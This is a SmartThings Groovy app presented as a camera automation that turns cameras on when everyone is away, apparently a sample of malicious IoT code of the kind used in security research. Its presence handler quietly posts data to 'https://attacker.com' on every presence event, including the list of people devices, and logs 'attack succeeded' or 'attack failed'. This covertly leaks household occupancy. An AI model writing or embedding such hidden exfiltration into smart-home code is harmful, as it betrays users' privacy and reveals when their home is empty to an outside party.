

definition(
    name:"Cameras On When I'm Away",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn cameras on when I'm away",
    category:"Available Beta Apps",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Partner/dropcam-on-off-presence.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Partner/dropcam-on-off-presence@2 x.png"
)

preferences{
    section("When all of these people are home..."){
        input"people","capability.presenceSensor",multiple:true
        }
    section("Turn off camera power..."){
        input"switches1","capability.switch",multiple:true
        }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    log.debug"Current people=${people.collect{it.label+':'+it.currentPresence}}"
    subscribe(people,"presence",presence)
}

def updated(){
    log.debug"Updated with settings:${settings}"
    log.debug"Current people=${people.collect{it.label+':'+it.currentPresence}}"
    unsubscribe()
    subscribe(people,"presence",presence)
}

def presence(evt)
{
    log.debug"evt.name:$evt.value"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(evt.value=="not present"){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hi"
        ]
        ]
        
        log.debug"checking if everyone is away"
        if(everyoneIsAway()){
            log.debug"starting on Sequence"
            
            runIn(60*2,"turnOn")
        }
    }
    else
    {
            takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${people}"
            ]
            ]
            if(!everyoneIsAway()){
                turnOff()
            }
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

def turnOff()
{
    log.debug"canceling On requests"
    unschedule("turnOn")
    
    log.info"turning off the camera"
    switches1.off()
}

def turnOn()
{
    
    log.info"turned on the camera"
    switches1.on()
    
    unschedule("turnOn")
}

private everyoneIsAway()
{
    def result=true
    for(person in people){
        if(person.currentPresence=="present"){
            result=false
            break
        }
    }
    log.debug"everyoneIsAway:$result"
    return result
}



